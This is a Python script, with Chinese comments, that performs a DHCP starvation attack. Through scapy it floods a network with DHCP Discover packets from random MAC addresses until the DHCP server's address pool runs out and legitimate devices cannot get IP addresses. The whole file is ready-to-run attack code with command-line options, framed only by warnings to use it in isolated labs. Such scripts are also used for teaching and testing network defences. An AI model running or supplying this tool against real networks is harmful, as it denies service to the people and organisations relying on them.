#!/usr/bin/env python3
"""
DHCP 耗尽攻击演示脚本
============================================
⚠️  仅限在隔离虚拟实验环境中使用！
⚠️  严禁在未授权的真实网络中使用！
============================================

原理：发送大量 DHCP Discover 请求（使用随机 MAC）
      耗尽 DHCP 服务器的地址池，导致合法终端无法获取 IP

用法:
  python dhcp_starvation.py --interface eth0
  python dhcp_starvation.py --interface eth0 --count 300
"""
import argparse
import random
import sys
import time

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP, sendp, conf
    )
except ImportError:
    print("[!] 需要安装 scapy: pip install scapy")
    sys.exit(1)

conf.verb = 0


def random_mac() -> str:
    """生成随机 MAC 地址"""
    mac = [
        0x00, 0x16, 0x3e,
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
    ]
    return ":".join(f"{b:02x}" for b in mac)


def dhcp_starvation(interface: str, count: int = 254):
    """
    DHCP 耗尽攻击
    Args:
        interface: 网卡接口名
        count: 发送请求数量
    """
    print(f"""
╔══════════════════════════════════════╗
║       DHCP 耗尽攻击演示            ║
║  ⚠️  仅限实验环境使用！            ║
╚══════════════════════════════════════╝
""")

    print(f"[*] 接口: {interface}")
    print(f"[*] 请求数: {count}")
    print(f"[*] 策略: 随机 MAC 地址请求\n")

    start_time = time.time()

    for i in range(count):
        mac = random_mac()
        xid = random.randint(1, 0xFFFFFFFF)

        # 构造 DHCP Discover 包
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(
                chaddr=bytes.fromhex(mac.replace(":", "")),
                xid=xid,
            ) /
            DHCP(options=[
                ("message-type", "discover"),
                ("param_req_list", [1, 3, 6, 15, 51, 58, 59]),
                "end",
            ])
        )

        sendp(pkt, iface=interface)

        if (i + 1) % 20 == 0:
            elapsed = time.time() - start_time
            print(f"  [+] 进度: {i + 1}/{count} | MAC: {mac} | 耗时: {elapsed:.1f}s")

    total_time = time.time() - start_time
    print(f"\n[*] 攻击完成: {count} 个 DHCP Discover, 耗时 {total_time:.1f}s")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP 耗尽攻击（仅限实验环境）")
    parser.add_argument("--interface", "-i", required=True, help="网卡接口")
    parser.add_argument("--count", "-c", type=int, default=254, help="请求数量")
    args = parser.parse_args()

    dhcp_starvation(args.interface, args.count)
